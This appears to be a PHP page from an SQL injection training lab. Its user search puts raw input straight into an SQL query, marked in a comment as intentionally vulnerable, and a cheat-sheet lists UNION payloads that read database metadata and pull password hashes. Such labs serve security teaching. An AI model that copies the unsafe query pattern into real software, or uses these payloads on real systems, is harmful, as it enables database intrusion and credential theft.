<?php
session_start();
require_once 'db.php';

// Access control: redirect to login if session does not exist
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}

$search = $_GET['search'] ?? '';
$search_results = [];
$search_error = '';
$executed_sql = '';

if ($search !== '') {
    // Intentionally VULNERABLE Search Query (UNION-based SQL Injection target)
    $executed_sql = "SELECT id, username, email, role FROM users WHERE username LIKE '%$search%'";
    
    $result = @mysqli_query($conn, $executed_sql);
    
    if (!$result) {
        $search_error = "SQL Error: " . mysqli_error($conn);
    } else {
        while ($row = mysqli_fetch_assoc($result)) {
            $search_results[] = $row;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - SQL Injection Lab</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>🔐 Protected Dashboard</h1>
            <p>Session Authenticated Area</p>
        </header>

        <div class="card">
            <h2>
                Welcome, <?= htmlspecialchars($_SESSION['username']) ?>!
                <span class="badge <?= $_SESSION['role'] === 'admin' ? 'badge-admin' : 'badge-user' ?>">
                    <?= htmlspecialchars($_SESSION['role']) ?>
                </span>
            </h2>

            <div class="alert alert-success">
                <strong>Session Status:</strong> Active & Authenticated!
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px;">
                <div style="background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid var(--card-border);">
                    <h4 style="color: var(--primary-color); margin-bottom: 8px;">User Profile</h4>
                    <p><strong>User ID:</strong> <?= $_SESSION['user_id'] ?></p>
                    <p><strong>Username:</strong> <?= htmlspecialchars($_SESSION['username']) ?></p>
                    <p><strong>Email:</strong> <?= htmlspecialchars($_SESSION['email'] ?? 'N/A') ?></p>
                    <p><strong>Role:</strong> <?= htmlspecialchars($_SESSION['role']) ?></p>
                </div>

                <div style="background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid var(--card-border);">
                    <h4 style="color: var(--primary-color); margin-bottom: 8px;">PHP Session Info</h4>
                    <p><strong>Session ID:</strong> <span style="font-family: monospace; font-size: 0.85rem; color: #fbbf24;"><?= session_id() ?></span></p>
                    <p><strong>$_SESSION Dump:</strong></p>
                    <pre style="font-size: 0.8rem; background: #030712; padding: 6px; border-radius: 4px; color: #a7f3d0; max-height: 80px; overflow-y: auto;"><?= htmlspecialchars(print_r($_SESSION, true)) ?></pre>
                </div>
            </div>

            <div style="margin-bottom: 25px;">
                <a href="logout.php" class="btn btn-danger">Log Out</a>
            </div>

            <hr style="border-color: var(--card-border); margin: 25px 0;">

            <h3>🔍 User Search Directory (UNION SQLi Challenge)</h3>
            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 15px;">
                Search for other registered users in the database.
            </p>

            <form action="index.php" method="GET" style="display: flex; gap: 10px; margin-bottom: 15px;">
                <input type="text" name="search" class="form-control" placeholder="Search username (e.g. alice or ' UNION SELECT...)" value="<?= htmlspecialchars($search) ?>">
                <button type="submit" class="btn">Search</button>
            </form>

            <?php if (!empty($executed_sql)): ?>
                <div class="query-debug">
                    <h4>Executed Search SQL:</h4>
                    <code><?= htmlspecialchars($executed_sql) ?></code>
                </div>
            <?php endif; ?>

            <?php if ($search_error): ?>
                <div class="alert alert-danger" style="margin-top: 15px;"><?= $search_error ?></div>
            <?php endif; ?>

            <?php if ($search !== '' && empty($search_error)): ?>
                <h4 style="margin-top: 15px;">Search Results (<?= count($search_results) ?> found):</h4>
                <?php if (count($search_results) > 0): ?>
                    <table class="user-table">
                        <thead>
                            <tr>
                                <th>ID / Col 1</th>
                                <th>Username / Col 2</th>
                                <th>Email / Col 3</th>
                                <th>Role / Col 4</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($search_results as $row): ?>
                                <tr>
                                    <td><?= htmlspecialchars($row['id'] ?? '') ?></td>
                                    <td><?= htmlspecialchars($row['username'] ?? '') ?></td>
                                    <td><?= htmlspecialchars($row['email'] ?? '') ?></td>
                                    <td><?= htmlspecialchars($row['role'] ?? '') ?></td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                <?php else: ?>
                    <p style="color: var(--text-secondary); margin-top: 10px;">No users matched your search query.</p>
                <?php endif; ?>
            <?php endif; ?>

            <div class="cheat-sheet" style="margin-top: 25px;">
                <h4>💡 UNION Injection Payload Examples:</h4>
                <p style="font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 8px;">
                    Try extracting internal MySQL metadata or password hashes:
                </p>
                <span class="payload-tag" onclick="location.href='index.php?search=' + encodeURIComponent(\"' UNION SELECT 1, @@version, user(), database() -- \")">' UNION SELECT 1, @@version, user(), database() -- </span>
                <span class="payload-tag" onclick="location.href='index.php?search=' + encodeURIComponent(\"' UNION SELECT 1, table_name, table_schema, 4 FROM information_schema.tables WHERE table_schema=database() -- \")">List Database Tables</span>
                <span class="payload-tag" onclick="location.href='index.php?search=' + encodeURIComponent(\"' UNION SELECT id, username, password, role FROM users -- \")">Exfiltrate Passwords</span>
            </div>
        </div>
    </div>
</body>
</html>
